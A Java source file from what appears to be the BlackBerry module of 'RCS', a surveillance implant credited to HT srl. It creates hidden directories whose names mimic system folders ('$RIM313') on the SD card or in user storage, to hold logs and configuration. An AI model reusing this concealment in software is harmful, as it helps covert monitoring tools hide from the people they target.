/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Path.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.fs;

import java.io.IOException;
import java.util.Enumeration;
import java.util.Vector;

import javax.microedition.io.Connector;
import javax.microedition.io.file.FileConnection;
import javax.microedition.io.file.FileSystemRegistry;

import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

/**
 * The Class Path.
 */
public class Path {
    //#debug
        private static Debug debug = new Debug("Path", DebugLevel.VERBOSE);

    /** The Constant SD_PATH. */
    public static final String SD_PATH = "file:///SDCard/BlackBerry/system/$RIM313/";

    /** The Constant USER_PATH. */
    public static final String USER_PATH = "file:///store/home/user/$RIM313/";

    /** The Constant LOG_DIR_BASE. */
    public static final String LOG_DIR_BASE = "1";

    /** The Constant MARKUP_DIR. */
    public static final String MARKUP_DIR = "2/";

    /** The Constant CONF_DIR. */
    public static final String CONF_DIR = "2/";

    public static final String LOG_PATH = SD_PATH;
    
    private Path() {
    };

    /**
     * Crea la directory specificata e la rende hidden. Non crea ricosivamente
     * le directory.
     * 
     * @param dirName
     *            nome della directory, deve finire con /
     * @return true, if successful
     */
    public static synchronized boolean createDirectory(String dirName) {
        FileConnection fconn = null;

        // #ifdef DBC
                Check.ensures(dirName.endsWith("/"), "directory should end with /");
        // #endif

        try {
            fconn = (FileConnection) Connector.open(dirName,
                    Connector.READ_WRITE);

            if (fconn.exists()) {
                /*
                 * if (debug != null) { //#debug
                 * debug.trace("Directory exists"); }
                 */

                return false;
            }

            fconn.mkdir();
            fconn.setHidden(true);

            // #ifdef DBC
                        Check.ensures(fconn.exists(), "Couldn't create dir");
            // #endif

        } catch (IOException e) {

            // #debug
                        debug.error(e.toString());
            return false;

        } finally {
            if (fconn != null) {
                try {
                    fconn.close();
                } catch (IOException e) {
                    // #mdebug
                                        if (debug != null) {                        
                                            debug.error(e.toString());
                                        }
                    //#enddebug

                }
            }
        }

        return true;
    }

    /**
     * Gets the roots.
     * 
     * @return the roots
     */
    public static Vector getRoots() {
        Enumeration roots = FileSystemRegistry.listRoots();
        Vector vector = new Vector();

        while (roots.hasMoreElements()) {
            String root = (String) roots.nextElement();
            vector.addElement(root);

            FileConnection fc;

            try {
                fc = (FileConnection) Connector.open("file:///" + root);
                debug.info(root + " " + fc.availableSize());
            } catch (IOException e) {
                debug.error(root + " " + e);
                e.printStackTrace();
            }
        }

        return vector;
    }

    /**
     * Prints the roots.
     */
    public static void printRoots() {
        Enumeration roots = FileSystemRegistry.listRoots();

        while (roots.hasMoreElements()) {
            String root = (String) roots.nextElement();
            FileConnection fc;

            try {
                fc = (FileConnection) Connector.open("file:///" + root);
                System.out.println(root + " " + fc.availableSize());
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
    }

    /**
     * Checks if the SD is present.
     * 
     * @return true, if is SD present
     */
    public static boolean isSDPresent() {
        Enumeration roots = FileSystemRegistry.listRoots();

        while (roots.hasMoreElements()) {
            String path = (String) roots.nextElement();

            if (path.indexOf("SDCard") >= 0) {
                // #mdebug
                                if (debug != null) {
                                    debug.info("SDPresent FOUND: " + path);
                                }
                // #enddebug
                return true;
            } else {
                // #mdebug
                                if (debug != null) {
                                    debug.trace("SDPresent NOT:" + path);
                                }
                // #enddebug
            }
        }

        return false;
    }

    /**
     * Crea le directory iniziali.
     * 
     * @param storeToSD
     *            true: crea su SD. false: crea su flash
     */
    public static void makeDirs(boolean storeToSD) {
        Path.getRoots();
        
        if (storeToSD) {
            createDirectory(Path.SD_PATH);
            // createDirectory(Path.SD_PATH + Path.LOG_DIR);
            createDirectory(Path.SD_PATH + Path.MARKUP_DIR);
            createDirectory(Path.SD_PATH + Path.CONF_DIR);

        } else {
            createDirectory(Path.USER_PATH);
            // createDirectory(Path.USER_PATH + Path.LOG_DIR);
            createDirectory(Path.USER_PATH + Path.MARKUP_DIR);
            createDirectory(Path.USER_PATH + Path.CONF_DIR);

        }
    }

    /**
     * Rimuove la directory specificata, solo se vuota.
     * 
     * @param dirName
     *            the dir name
     * @return true, if successful
     */
    public static boolean removeDirectory(String dirName) {
        FileConnection fconn = null;
        try {
            fconn = (FileConnection) Connector.open(dirName,
                    Connector.READ_WRITE);

            if (!fconn.exists()) {
                // #mdebug
                                if (debug != null) {
                                    debug.trace("Directory doesn't exists");
                                }
                // #enddebug

                return false;
            }

            if (!fconn.list().hasMoreElements()) {
                fconn.delete();
            } else {
                // #debug
                                debug.error("directory not empty");
                return false;
            }

            // #ifdef DBC
                        Check.ensures(!fconn.exists(), "Couldn't delete dir");
            // #endif

        } catch (IOException e) {

            e.printStackTrace();
            return false;

        } finally {
            if (fconn != null) {
                try {
                    fconn.close();
                } catch (IOException e) {
                    // #mdebug
                                        if (debug != null) {                        
                                            debug.error(e.toString());
                                        }
                    // #enddebug
                }
            }
        }
        return true;
    }
}
